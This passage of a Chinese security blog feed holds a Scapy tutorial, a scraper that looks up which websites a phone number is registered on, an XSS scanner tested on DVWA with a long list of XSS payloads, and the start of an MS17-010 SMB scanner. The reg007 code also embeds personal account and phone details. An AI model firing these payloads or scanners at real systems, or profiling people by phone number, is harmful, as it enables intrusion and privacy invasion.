NoneSNMPtrapv2 : NoneSNMPvarbind : NoneSTP        : Spanning Tree ProtocolSkinny     : SkinnyTCP        : TCPTCPerror   : TCP in ICMPTFTP       : TFTP opcodeTFTP_ACK   : TFTP AckTFTP_DATA  : TFTP DataTFTP_ERROR : TFTP ErrorTFTP_OACK  : TFTP Option AckTFTP_Option : NoneTFTP_Options : NoneTFTP_RRQ   : TFTP Read RequestTFTP_WRQ   : TFTP Write RequestUDP        : UDPUDPerror   : UDP in ICMPUSER_CLASS_DATA : user class dataVENDOR_CLASS_DATA : vendor class dataVENDOR_SPECIFIC_OPTION : vendor specific option dataVRRP       : NoneVRRPv3     : NoneVXLAN      : VXLANX509_AccessDescription : NoneX509_AlgorithmIdentifier : NoneX509_Attribute : NoneX509_AttributeTypeAndValue : NoneX509_AttributeValue : NoneX509_CRL   : NoneX509_Cert  : NoneX509_DNSName : NoneX509_DirectoryName : NoneX509_EDIPartyName : NoneX509_ExtAuthInfoAccess : NoneX509_ExtAuthorityKeyIdentifier : NoneX509_ExtBasicConstraints : NoneX509_ExtCRLDistributionPoints : NoneX509_ExtCRLNumber : NoneX509_ExtCertificateIssuer : NoneX509_ExtCertificatePolicies : NoneX509_ExtComment : NoneX509_ExtDefault : NoneX509_ExtDeltaCRLIndicator : NoneX509_ExtDistributionPoint : NoneX509_ExtDistributionPointName : NoneX509_ExtExtendedKeyUsage : NoneX509_ExtFreshestCRL : NoneX509_ExtFullName : NoneX509_ExtGeneralSubtree : NoneX509_ExtInhibitAnyPolicy : NoneX509_ExtInvalidityDate : NoneX509_ExtIssuerAltName : NoneX509_ExtIssuingDistributionPoint : NoneX509_ExtKeyUsage : NoneX509_ExtNameConstraints : NoneX509_ExtNameRelativeToCRLIssuer : NoneX509_ExtNetscapeCertType : NoneX509_ExtNoticeReference : NoneX509_ExtPolicyConstraints : NoneX509_ExtPolicyInformation : NoneX509_ExtPolicyMappings : NoneX509_ExtPolicyQualifierInfo : NoneX509_ExtPrivateKeyUsagePeriod : NoneX509_ExtQcStatement : NoneX509_ExtQcStatements : NoneX509_ExtReasonCode : NoneX509_ExtSubjInfoAccess : NoneX509_ExtSubjectAltName : NoneX509_ExtSubjectDirectoryAttributes : NoneX509_ExtSubjectKeyIdentifier : NoneX509_ExtUserNotice : NoneX509_Extension : NoneX509_Extensions : NoneX509_GeneralName : NoneX509_IPAddress : NoneX509_OtherName : NoneX509_PolicyMapping : NoneX509_RDN   : NoneX509_RFC822Name : NoneX509_RegisteredID : NoneX509_RevokedCertificate : NoneX509_SubjectPublicKeyInfo : NoneX509_TBSCertList : NoneX509_TBSCertificate : NoneX509_URI   : NoneX509_Validity : NoneX509_X400Address : None_DHCP6OptGuessPayload : None_DNSRRdummy : Dummy class that implements post_build() for Resource Records_ESPPlain  : ESP_ICMPv6    : ICMPv6 dummy class_ICMPv6Error : ICMPv6 errors dummy class_ICMPv6ML  : ICMPv6 dummy class_IPOption_HDR : None_IPv46     : IP_IPv6ExtHdr : Abstract IPv6 Option Header_LLMNR     : None_MobilityHeader : Dummy IPv6 Mobility Header_RadiusAttrHexStringVal : Radius Attribute_RadiusAttrIPv4AddrVal : Radius Attribute_RadiusAttrIntEnumVal : Radius Attribute_RadiusAttrIntValue : Radius Attribute_SpecificRadiusAttr : Radius AttributeNone</code></pre><p>查看支持的指令集</p><pre><code>from scapy.all import *print(lsc())</code></pre><p><img src="https://i.imgur.com/SDo5V1G.png" alt=""></p><pre><code>IPID_count          : Identify IP id values classes in a list of packetsarpcachepoison      : Poison target&apos;s cache with (your MAC,victim&apos;s IP) couplearping              : Send ARP who-has requests to determine which hosts are upbind_layers         : Bind 2 layers on some specific fields&apos; valuesbridge_and_sniff    : Forward traffic between interfaces if1 and if2, sniff and returnchexdump            :  Build a per byte hexadecimal representationcomputeNIGroupAddr  : Compute the NI group Address. Can take a FQDN as input parametercorrupt_bits        : Flip a given percentage or number of bits from a stringcorrupt_bytes       : Corrupt a given percentage or number of bytes from a stringdefrag              : defrag(plist) -&gt; ([not fragmented], [defragmented],defragment          : defrag(plist) -&gt; plist defragmented as much as possible dhcp_request        : --dyndns_add          : Send a DNS add message to a nameserver for &quot;name&quot; to have a new &quot;rdata&quot;dyndns_del          : Send a DNS delete message to a nameserver for &quot;name&quot;etherleak           : Exploit Etherleak flawfletcher16_checkbytes:  Calculates the Fletcher-16 checkbytes returned as 2 byte binary-string.fletcher16_checksum :  Calculates Fletcher-16 checksum of the given buffer.fragleak            : --fragleak2           : --fragment            : Fragment a big IP datagramfuzz                : Transform a layer into a fuzzy layer by replacing some default values by random objectsgetmacbyip          : Return MAC address corresponding to a given IP addressgetmacbyip6         : Returns the MAC address corresponding to an IPv6 addresshexdiff             : Show differences between 2 binary stringshexdump             :  Build a tcpdump like hexadecimal viewhexedit             : --hexstr              : --import_hexcap       : --is_promisc          : Try to guess if target is in Promisc mode. The target is provided by its ip.linehexdump         :  Build an equivalent view of hexdump() on a single linels                  : List  available layers, or infos on a given layer class or nameneighsol            : Sends an ICMPv6 Neighbor Solicitation message to get the MAC address of the neighbor with specified IPv6 address addroverlap_frag        : Build overlapping fragments to bypass NIPSpromiscping         : Send ARP who-has requests to determine which hosts are in promiscuous moderdpcap              : Read a pcap or pcapng file and return a packet listreport_ports        : portscan a target and output a LaTeX tablerestart             : Restarts scapysend                : Send packets at layer 3sendp               : Send packets at layer 2sendpfast           : Send packets at layer 2 using tcpreplay for performancesniff               : split_layers        : Split 2 layers previously boundsr                  : Send and receive packets at layer 3sr1                 : Send packets at layer 3 and return only the first answersr1flood            : Flood and receive packets at layer 3 and return only the first answersrbt                : send and receive using a bluetooth socketsrbt1               : send and receive 1 packet using a bluetooth socketsrflood             : Flood and receive packets at layer 3srloop              : Send a packet at layer 3 in loop and print the answer each timesrp                 : Send and receive packets at layer 2srp1                : Send and receive packets at layer 2 and return only the first answersrp1flood           : Flood and receive packets at layer 2 and return only the first answersrpflood            : Flood and receive packets at layer 2srploop             : Send a packet at layer 2 in loop and print the answer each timetcpdump             : Run tcpdump or tshark on a list of packetstraceroute          : Instant TCP traceroutetraceroute6         : Instant TCP traceroute using IPv6traceroute_map      : Util function to call traceroute on multiple targets, thentshark              : Sniff packets and print them calling pkt.summary(), a bit like text wiresharkwireshark           : Run wireshark on a list of packetswrpcap              : Write a list of packets to a pcap fileNone</code></pre><p>arping得到所在局域网内所有可用的ip与mac的对应关系</p><pre><code>from scapy.all import *print(arping(&quot;192.168.89.255/80&quot;))</code></pre><p><img src="https://i.imgur.com/FXMIyan.png" alt=""></p><pre><code>Begin emission:Finished sending 1 packets.Received 0 packets, got 0 answers, remaining 1 packets(&lt;ARPing: TCP:0 UDP:0 ICMP:0 Other:0&gt;, &lt;Unanswered: TCP:0 UDP:0 ICMP:0 Other:1&gt;)</code></pre><p>携带参数模式</p><pre><code>from scapy.all import *print(ls(UDP))</code></pre><p><img src="https://i.imgur.com/jQujPUM.png" alt=""></p><pre><code>sport      : ShortEnumField                      = (53)dport      : ShortEnumField                      = (53)len        : ShortField                          = (None)chksum     : XShortField                         = (None)None</code></pre><p><strong>IP模块的使用：</strong><br>我们可以实例化一个IP对象<br><img src="https://i.imgur.com/JsfJ1pB.png" alt=""><br>也可以传入需要自定义的参数<br><img src="https://i.imgur.com/4oQX6H5.png" alt=""><br>查看 IP 模块对象的所有信息<br><img src="https://i.imgur.com/kerW2wG.png" alt=""><br><strong>发送报文：</strong><br><img src="https://i.imgur.com/F6nCWBR.png" alt=""><br><strong>接收报文：</strong><br>测试：<br>开启两个终端,一边发送报文一边接收报文<br><img src="https://i.imgur.com/A1PJRMm.png" alt=""></p><p><strong>细说数据发送：</strong><br>send在第三层发送数据包，但没有接收功能<br><img src="https://i.imgur.com/JkZaTa9.png" alt=""></p><p>向某个IP发送一个数据包：</p><pre><code>import structfrom scapy.all import *data = struct.pack(&apos;=BHI&apos;, 0x13, 0x5EF3, 0x96)pkt = IP(src=&apos;127.0.0.1&apos;, dst=&apos;127.0.0.1&apos;)/UDP(sport=12345,dport=5555)/datasend(pkt, inter=1, count=5)</code></pre><p><img src="https://i.imgur.com/k8ZBF0Q.png" alt=""></p><p>在第二层发送数据包，同样没有接收功能。</p><pre><code>import structfrom scapy.all import *dar=sendp(Ether()/IP(dst=&quot;www.baidu.com&quot;,ttl=4)/ICMP())print(dar)</code></pre><p><img src="https://i.imgur.com/FoaZGrM.png" alt=""></p><p>sr在第三层发送数据包，有接收功能</p><p><img src="https://i.imgur.com/XHsj3Hq.png" alt=""></p><p>sr1在第三层发送数据包，有接收功能，但只接收第一个包<br><img src="https://i.imgur.com/Y7GOUL2.png" alt=""></p><p>srloop在第三层工作<br><img src="https://i.imgur.com/BKt1Chw.png" alt=""><br>srp在第二层发送数据包，有接收功能<br><img src="https://i.imgur.com/KCuNS3U.png" alt=""><br>srp1在第二层发送数据包，有接收功能，但只接收第一个包。以上面的发送四个包为例</p><p><img src="https://i.imgur.com/3bNMq7Q.png" alt=""><br>srploop在第三层工作<br><img src="https://i.imgur.com/cn5rcKX.png" alt=""></p><p>好了，到现在我们已经详细的认识了scapy的一部分功能。也细说了发送的功能。下次我们在学习，去看漏洞银行七夕直播了<br>转载请声明：422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>抓取reg007的过程</title>
      <link href="/2018/08/17/%E6%8A%93%E5%8F%96reg007%E7%9A%84%E8%BF%87%E7%A8%8B/"/>
      <url>/2018/08/17/%E6%8A%93%E5%8F%96reg007%E7%9A%84%E8%BF%87%E7%A8%8B/</url>
      <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>之前有那么一丝想抓取一个Reg007网站的想法，但是之前因为<br>上学没有时间。所以没抓</p><p><img src="https://i.imgur.com/EuUIzvh.jpg" alt=""></p><h2 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h2><p><img src="https://i.imgur.com/LjWPxZx.png" alt=""></p><p>Reg007是一个可以查到，你手机号注册了什么网站的一个站。<br>我们不登陆的话可以查询到三个注册过的网站。</p><p><img src="https://i.imgur.com/NGKThwI.png" alt=""></p><p>那么我们来抓包一次看看到底是怎么回事</p><p><img src="https://i.imgur.com/rHgJO1W.png" alt=""></p><p>从这里我们可以看出这里的抓到的请求，请求参数为</p><pre><code>q：你的手机号码</code></pre><p>然后需要在cookie带上你手机号发送：</p><pre><code>_ga=GA1.2.1107102936.1534170998; _gid=GA1.2.1501069481.1534324705; reg007_c_s_t=2; reg007_think_language=zh-CN; PHPSESSID=gtnua8rhph3d80u3umktadimk6; reg007_f_c_j=958dcf85640ae27962c2c9f9cd00574f; reg007_q=手机号</code></pre><p>然后我们登陆账号在试试查询</p><p><img src="https://i.imgur.com/bvC2KyZ.png" alt=""></p><p>可以看出用了登陆cookie之后我们能查到全部。（我草码又没打好<br>不打了草）</p><p>思路：</p><pre><code>1.首先进行登陆2.然后抓取登陆的cookie进行查询</code></pre><p>代码：（烂的一匹，死活不知道怎么获取Request Cookie）</p><pre><code>import requestsimport reimport timefrom bs4 import BeautifulSoupdef reg():    headers={&apos;user-agent&apos;:&apos;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36&apos;}    url=&apos;https://www.reg007.com/&apos;    loginurl=&apos;https://www.reg007.com/account/signin&apos;    sous=&apos;https://www.reg007.com/search?q=查询的手机号&apos;    zq=requests.get(url=url,headers=headers)    search=re.search(&apos;value=&quot;.*&quot;&apos;,zq.text)    qz=str(search.group()).replace(&apos;&quot;&apos;,&apos;&apos;).replace(&apos;value&apos;,&apos;&apos;)    cs=&apos;account=你的账号&amp;password=你的密码&amp;remember=on&amp;__csrf__{}&apos;.format(qz)    datas={}    cookies={}    cookiev=&apos;_ga=GA1.2.1107102936.1534170998; _gid=GA1.2.1501069481.1534324705; reg007_c_s_t=2; reg007_q=13113190031; reg007_account=18938561951; reg007_password=86e6a966a434f11cfa0ad215d1eaa8b0; reg007_think_language=zh-CN; PHPSESSID=jt6c1djpm2ep7qnte3d1svuen4; _gat=1&apos;    for c in cs.split(&apos;&amp;&apos;):        key,value=c.split(&apos;=&apos;,1)        datas[key]=value    for k in cookiev.split(&apos;;&apos;):        key,value=k.split(&apos;=&apos;,1)        cookies[key]=value    #print(zq.headers)    hq=requests.get(url=loginurl,headers=headers)    reqts=requests.session()    login=reqts.post(url=loginurl,headers=headers,data=datas,cookies=cookies)    if login.url == &apos;https://www.reg007.com/account&apos;:        print(&apos;[+]Landing success !&apos;)        cv= {}        cookiesw=&apos;_ga=GA1.2.1107102936.1534170998; _gid=GA1.2.1501069481.1534324705; reg007_c_s_t=2; reg007_think_language=zh-CN; PHPSESSID=gtnua8rhph3d80u3umktadimk6; reg007_f_c_j=958dcf85640ae27962c2c9f9cd00574f; reg007_q=13113190031; reg007_account=18938561951; reg007_password=86e6a966a434f11cfa0ad215d1eaa8b0&apos;        for u in cookiesw.split(&apos;;&apos;):            key,value=u.split(&apos;=&apos;,1)            cv[key]=value        dw = reqts.get(url=sous, headers=headers,cookies=cv)        time.sleep(5)        kivs = BeautifulSoup(dw.text, &apos;html.parser&apos;)        fd=re.findall(&apos;.*\|&apos;,kivs.get_text())        for f in fd:            print(str(f).replace(&apos;(&apos;,&apos;&apos;).replace(&apos;adsbygoogle&apos;,&apos;&apos;).replace(&apos;=&apos;,&apos;&apos;).replace(&apos;window&apos;,&apos;&apos;).replace(&apos;.&apos;,&apos;&apos;).replace(&apos;||&apos;,&apos;&apos;).replace(&apos;functioni&apos;,&apos;&apos;).replace(&apos;s&apos;,&apos;&apos;).replace(&apos;o&apos;,&apos;&apos;).replace(&apos;g&apos;,&apos;&apos;).replace(&apos;r&apos;,&apos;&apos;).replace(&apos;a&apos;,&apos;&apos;).replace(&apos;,&apos;,&apos;&apos;).replace(&apos;m&apos;,&apos;&apos;).replace(&apos;{&apos;,&apos;&apos;).replace(&apos;i&apos;,&apos;&apos;).replace(&apos;[&apos;,&apos;&apos;).replace(&quot;&apos;&quot;,&apos;&apos;).replace(&apos;)&apos;,&apos;&apos;).replace(&apos;GleAnlytcObject&apos;,&apos;&apos;).replace(&apos;]&apos;,&apos;&apos;).replace(&apos;;&apos;,&apos;&apos;).replace(&apos;q&apos;,&apos;&apos;))            #print(f)    else:        print(&apos;[-]Landing failure !&apos;)        exit()#gz=requests.get(url=url,headers=headers)#PHPSESSID=gz.cookies#search2=re.search(&apos;PHPSESSID=.*&apos;,str(PHPSESSID))#PHPSESSID=str(search2).replace(&apos;&lt;&apos;,&apos;&apos;).replace(&apos;_&apos;,&apos;&apos;).replace(&apos;sre&apos;,&apos;&apos;).replace(&apos;.&apos;,&apos;&apos;).replace(&apos;SREMatch&apos;,&apos;&apos;).replace(&apos;object&apos;,&apos;&apos;).replace(&apos;;&apos;,&apos;&apos;).replace(&apos;span=&apos;,&apos;&apos;).replace(&apos;(&apos;,&apos;&apos;).replace(&apos;27&apos;,&apos;&apos;).replace(&apos;,&apos;,&apos;&apos;).replace(&apos;162&apos;,&apos;&apos;).replace(&apos;)&apos;,&apos;&apos;).replace(&apos;match=&apos;,&apos;&apos;).replace(&apos;for&apos;,&apos;&apos;).replace(&apos;wwwreg0&apos;,&apos;&apos;).replace(&apos;&gt;&apos;,&apos;&apos;).replace(&quot;&apos;&quot;,&apos;&apos;).strip()#COOKIES=&apos;reg007_think_language=zh-CN;{};reg007_c_s_t=1; reg007_account=18938561951;reg007_password={}&apos;.format(PHPSESSID)#cas={}#cks=&apos;Cookie: reg007_think_language=zh-CN; PHPSESSID=evtmr498kqegclhchh3etkqv27; reg007_c_s_t=1; reg007_account=18938561951; reg007_password=86e6a966a434f11cfa0ad215d1eaa8b0; reg007_q=13113190031; reg007_f_c_j=acca75fee2492ffacbc22c9640bca829; _ga=GA1.2.714340125.1534326028; _gid=GA1.2.519570063.1534326028&apos;#for l in cks.split(&apos;;&apos;):    #key,value=l.split(&apos;=&apos;,1)    #cas[key]=valuereg()</code></pre><p>效果还是那么烂：<br><img src="https://i.imgur.com/OqYlj1H.png" alt=""></p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>写个xss检测器怎么样</title>
      <link href="/2018/08/14/%E5%86%99%E4%B8%AAxss%E6%A3%80%E6%B5%8B%E5%99%A8%E6%80%8E%E4%B9%88%E6%A0%B7/"/>
      <url>/2018/08/14/%E5%86%99%E4%B8%AAxss%E6%A3%80%E6%B5%8B%E5%99%A8%E6%80%8E%E4%B9%88%E6%A0%B7/</url>
      <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>前言都写了好多次了，都不知道写什么了。。。就是之前已经写了SQL注入的检测了。顺便把xss检测写了<br><img src="https://ss0.bdstatic.com/70cFuHSh_Q1YnxGkpoWK1HF6hhy/it/u=1794900033,2842336697&amp;fm=15&amp;gp=0.jpg" alt=""></p><h2 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h2><p>为了进行测试，首先搭建DVWA环境。这里我用Ubuntu搭建的<br>搭建环境这里我就不说了。<br><strong>漏洞说明：</strong></p><pre><code>xss漏洞（跨站脚本注入漏洞）攻击者将恶意的JavaScript代码注入到页面发起恶意攻击当注入成功的时候页面会有注入成功的语句</code></pre><p><strong>代码思路：</strong></p><pre><code>1.首先遍历存放xss payload的文件夹，进行读取2.让使用者输入URL并要在指定插入xss payload的地方插入*3.替换*为xss的payload4.检测页面是否有注入成功的xss payload5.将注入成功的语句写入一个txt里</code></pre><p>代码：</p><pre><code>import requestsimport osimport redef scan():    xj = open(&apos;save.txt&apos;, &apos;w&apos;)    xj.close()    headers = {&apos;user-agent&apos;: &apos;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36&apos;}    cookies={}    user=input(&apos;url:&apos;)    cookier=input(&apos;cookie:&apos;)    for c in cookier.split(&apos;;&apos;):        key,value=c.split(&apos;=&apos;,1)        cookies[key]=value    print(cookies)    print(&apos;[*]{}&apos;.format(user))    dq = os.listdir(&apos;xss_payload&apos;)    for line in dq:        print(&apos;[+]{}&apos;.format(line))        ds = open(&apos;xss_payload/{}&apos;.format(line),&apos;r&apos;)        for we in ds.readlines():            #print(we)            qc=&apos;&apos;.join(we.split(&apos;\n&apos;))            th=user.replace(&apos;*&apos;,&apos;{}&apos;.format(qc))            try:                rest=requests.session()                livs=rest.get(url=th,headers=headers,cookies=cookies)                if qc in livs.text:                    print(&apos;[+]xss payload:{}{}&apos;.format(livs.url,qc))                    print(&apos;[+]xss payload:{}{}&apos;.format(livs.url, qc),file=open(&apos;save.txt&apos;,&apos;a&apos;))                else:                    print(&apos;[-]Not xss payload:{}&apos;.format(qc))            except Exception as r:                print(&apos;[-]Error {}&apos;.format(r))scan()</code></pre><p>DVWA低级到高级的测试：<br>（不可能级别将字符实体化已经不存在xss漏洞）</p><p>low级：<br><img src="https://i.imgur.com/WIq2zh2.png" alt=""></p><p><img src="https://i.imgur.com/fROnc2q.png" alt=""></p><p><img src="https://i.imgur.com/5VZEJHo.png" alt=""></p><p><img src="https://i.imgur.com/G1mKsVr.png" alt=""></p><p>随便找个Payload来测试一下：<br><img src="https://i.imgur.com/3XQvlRI.png" alt=""></p><p>Medium级：<br><img src="https://i.imgur.com/QUlr9sT.png" alt=""></p><p><img src="https://i.imgur.com/EBQqVdG.png" alt=""></p><p><img src="https://i.imgur.com/e7pfFcm.png" alt=""></p><p><img src="https://i.imgur.com/sk6gMIG.png" alt=""></p><p>随便找个 payload来测试下：<br><img src="https://i.imgur.com/8b0BX5E.png" alt=""></p><p><img src="https://i.imgur.com/5EfPuns.png" alt=""></p><p>high级：<br><img src="https://i.imgur.com/Pr6f1gY.png" alt=""></p><p><img src="https://i.imgur.com/DA4ySjz.png" alt=""></p><p><img src="https://i.imgur.com/yMr49wY.png" alt=""></p><p><img src="https://i.imgur.com/dU8jDkQ.png" alt=""><br>随便找个payload：<br><img src="https://i.imgur.com/oW3YRt7.png" alt=""></p><p>收集到的payload古灵精怪的，有一些不只是弹窗。<br>一些常用的手动xss测试语句：</p><pre><code>javascript:alert(1)//INJECTX&lt;svg/onload=alert(1)&gt;//INJECTX&lt;img onload=alert(1)&gt;//INJECTX&lt;img src=x onerror=prompt(1)&gt;//INJECTX&lt;a href=&quot;javascript:alert(1)&quot; onmouseover=alert(1)&gt;INJECTX HOVER&lt;/a&gt; onmouseover=&quot;document.cookie=true;&quot;&gt;//INJECTXalert(1)&gt;//INJECTX&lt;h1&gt;INJECTX&lt;/h1&gt;&lt;img src=x onload=prompt(1) onerror=alert(1) onmouseover=prompt(1)&gt;&lt;svg&gt;&lt;script&gt;/&lt;@/&gt;alert(1)&lt;/script&gt;//INJECTX&lt;svg/onload=alert(/INJECTX/)&gt;&lt;iframe/onload=alert(/INJECTX/)&gt;&lt;svg/onload=alert`INJECTX`&gt;&lt;svg/onload=alert(/INJECTX/)&gt;&lt;svg/onload=alert(`INJECTX`)&gt;}alert(/INJECTX/);{//&lt;h1/onclick=alert(1)&gt;a//INJECTX&lt;svg/onload=alert(/INJECTX/)&gt;&lt;p/onclick=alert(/INJECTX/)&gt;a&lt;svg/onload=alert`INJECTX`&gt;&lt;svg/onload=alert(/INJECTX/)&gt;&lt;svg/onload=alert(`INJECTX`)&gt;&lt;video&gt;&lt;source onerror=&quot;javascript:alert(1)&quot;&gt;//INJECTX&lt;video onerror=&quot;javascript:alert(1)&quot;&gt;&lt;source&gt;//INJECTX&lt;audio onerror=&quot;javascript:alert(1)&quot;&gt;&lt;source&gt;//INJECTX&lt;input autofocus onfocus=alert(1)&gt;//INJECTX&lt;select autofocus onfocus=alert(1)&gt;//INJECTX&lt;textarea autofocus onfocus=alert(1)&gt;//INJECTX&lt;keygen autofocus onfocus=alert(1)&gt;//INJECTX&lt;button form=test onformchange=alert(1)&gt;//INJECTX&lt;form&gt;&lt;button formaction=&quot;javascript:alert(1)&quot;&gt;//INJECTX&lt;svg onload=(alert)(1) &gt;//INJECTX&lt;script&gt;$=1,alert($)&lt;/script&gt;//INJECTX&lt;!--&lt;img src=&quot;--&gt;&lt;img src=x onerror=alert(1)//&quot;&gt;//INJECTX&lt;img/src=&apos;x&apos;onerror=alert(1)&gt;//INJECTX&lt;marguee/onstart=alert(1)&gt;//INJECTX&lt;script&gt;alert(1)//INJECTX&lt;script&gt;alert(1)&lt;!--INJECTX&lt;marquee loop=1 width=0 onfinish=alert(1)&gt;//INJECTX</code></pre><p>xss万能注入语句：<a href="https://www.jianshu.com/p/3f16269c83db" target="_blank" rel="noopener">https://www.jianshu.com/p/3f16269c83db</a><br>转载请声明：专自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>抓取云悉接口</title>
      <link href="/2018/08/12/%E6%8A%93%E5%8F%96%E4%BA%91%E6%82%89%E6%8E%A5%E5%8F%A3/"/>
      <url>/2018/08/12/%E6%8A%93%E5%8F%96%E4%BA%91%E6%82%89%E6%8E%A5%E5%8F%A3/</url>
      <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>前段时间一直想抓web指纹，发现手动抓的残缺不全还不准确。后来想抓云悉<br>指纹没有做。现在正好有时间爬了。<br><img src="https://i.imgur.com/AE9yFBG.jpg" alt=""></p><h2 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h2><p>我们首先来抓包，分析一下URL<br>云悉：<a href="http://www.yunsee.cn/" target="_blank" rel="noopener">http://www.yunsee.cn/</a></p><p><img src="https://i.imgur.com/LXEWIFX.png" alt=""></p><p>有type,url,string,_token。这几个参数</p><pre><code>通查看网页源代码可以得出，string的参数是固定的。而_token是可以从网页源代码获取的。url是你自己的type是cms查询的类型，还有一个查whois的</code></pre><p>然后可以得出思路：</p><pre><code>1.利用正则的search搜索功能抓取_token2.过滤掉_token一些无关紧要的符合3.组成参数4.经过循环并且加入字典5.发送post请求并带上参数6.解刨json数据</code></pre><p>代码：</p><pre><code>import requestsimport threadingimport redef zhuaq(urls):user=input(&apos;url:&apos;)data={}data2={}headers={&apos;user-agent&apos;:&apos;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36&apos;}url2=&apos;http://www.yunsee.cn/home/getInfo&apos;reqts=requests.get(url=urls,headers=headers)search=re.search(&apos;_token:.*&apos;,reqts.text)token=&apos;{}&apos;.format(search.group()).replace(&apos;}&apos;,&apos;&apos;).replace(&apos;,&apos;,&apos;&apos;).replace(&apos;&quot;&apos;,&apos;&apos;).replace(&apos;:&apos;,&apos;&apos;).replace(&apos;_token&apos;,&apos;&apos;).strip()datas=&apos;type=webcms&amp;url={}&amp;_token={}&apos;.format(user,token)datas2 = &apos;type=webinfo&amp;url={}&amp;_token={}&apos;.format(user, token)for v in datas.split(&apos;&amp;&apos;):    key,value=v.split(&apos;=&apos;,1)    data[key]=valuereqvs=requests.post(url=url2,headers=headers,data=data)jsons=reqvs.json()for v in datas2.split(&apos;&amp;&apos;):    key, value = v.split(&apos;=&apos;, 1)    data2[key] = valuereqvs2 = requests.post(url=url2, headers=headers, data=data2)json2=reqvs2.json()print(&apos;url:{}&apos;.format(user))print(&apos;whois_dns:{}&apos;.format(json2[&apos;res&apos;][&apos;whois_dns&apos;]))print(&apos;icp_name:{}&apos;.format(json2[&apos;res&apos;][&apos;icp_name&apos;]))print(&apos;ip:{}&apos;.format(json2[&apos;res&apos;][&apos;ip&apos;]))print(&apos;language:{}&apos;.format(json2[&apos;res&apos;][&apos;language&apos;]))print(&apos;whois_mail:{}&apos;.format(json2[&apos;res&apos;][&apos;whois_mail&apos;]))print(&apos;os:{}&apos;.format(json2[&apos;res&apos;][&apos;os&apos;]))print(&apos;cdn:{}&apos;.format(json2[&apos;res&apos;][&apos;cdn&apos;]))print(&apos;server:{}&apos;.format(json2[&apos;res&apos;][&apos;server&apos;]))print(&apos;record_id:{}&apos;.format(json2[&apos;res&apos;][&apos;record_id&apos;]))print(&apos;whois_isp:{}&apos;.format(json2[&apos;res&apos;][&apos;whois_isp&apos;]))#print(&apos;LLC:{}&apos;.format(json2[&apos;res&apos;][&apos;LLC&apos;]))print(&apos;whois_date:{}&apos;.format(json2[&apos;res&apos;][&apos;whois_date&apos;]))print(&apos;create:{}&apos;.format(json2[&apos;res&apos;][&apos;create&apos;]))print(&apos;icp_id:{}&apos;.format(json2[&apos;res&apos;][&apos;icp_id&apos;]))print(&apos;whois_name:{}&apos;.format(json2[&apos;res&apos;][&apos;whois_name&apos;]))print(&apos;idc:{}&apos;.format(json2[&apos;res&apos;][&apos;idc&apos;]))print(&apos;cms:{}&apos;.format(jsons[&apos;mess&apos;]))for reqs in jsons[&apos;res&apos;][0:]:    print(&apos;desc:{} name:{}&apos;.format(reqs[&apos;desc&apos;],reqs[&apos;name&apos;]))def run():    url = &apos;http://www.yunsee.cn/&apos;    t=threading.Thread(target=zhuaq,args=(url,))    t.start()if __name__ == &apos;__main__&apos;:    run()</code></pre><p>测试效果图：<br><img src="https://i.imgur.com/74eBaKb.png" alt=""></p><p>转载请声明来自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>python写MS17-010扫描器</title>
      <link href="/2018/08/11/python%E5%86%99MS17-010%E6%89%AB%E6%8F%8F%E5%99%A8/"/>
      <url>/2018/08/11/python%E5%86%99MS17-010%E6%89%AB%E6%8F%8F%E5%99%A8/</url>
      <content type="html"><![CDATA[<p>前言：<br>MS17-010早已是上一年的事情了。只不过想写一个检测脚本方便自己进行测试和用<br><img src="https://ss1.bdstatic.com/70cFuXSh_Q1YnxGkpoWK1HF6hhy/it/u=1136046643,4023666134&amp;fm=27&amp;gp=0.jpg" alt=""></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文:"></a>正文:</h2><p>先说思路：</p><pre><code>    negotiate_protocol_request = binascii.unhexlify(    &quot;00000085ff534d4272000000001853c00000000000000000000000000000fffe00004000006200025043204e4554574f524b2050524f4752414d20312e3000024c414e4d414e312e30000257696e646f777320666f7220576f726b67726f75707320332e316100024c4d312e325830303200024c414e4d414e322e3100024e54204c4d20302e313200&quot;)session_setup_request = binascii.unhexlify(    &quot;00000088ff534d4273000000001807c00000000000000000000000000000fffe000040000dff00880004110a000000000000000100000000000000d40000004b000000000000570069006e0064006f007700730020003200300030003000200032003100390035000000570069006e0064006f007700730020003200300030003000200035002e0030000000&quot;)tree_connect_request = binascii.unhexlify(    &quot;00000060ff534d4275000000001807c00000000000000000000000000000fffe0008400004ff006000080001003500005c005c003100390032002e003100360038002e003100370035002e003100320038005c00490050004300240000003f3f3f3f3f00&quot;)trans2_session_setup = binascii.unhexlify(    &quot;0000004eff534d4232000000001807c00000000000000000000000000008fffe000841000f0c0000000100000000000000a6d9a40000000c00420000004e0001000e000d0000000000000000000000000000&quot;)</code></pre><p>1.先把这些payload(首先把payload进行字符化)发送到目标主机<br>2.然后读取返回的数据进行判断<br>3.验证是否存在MS17010漏洞</p><p>代码：</p><pre><code>import socketimport binasciiimport structimport sysuser=input(&apos;IP:&apos;)def scan():payload0 = binascii.unhexlify 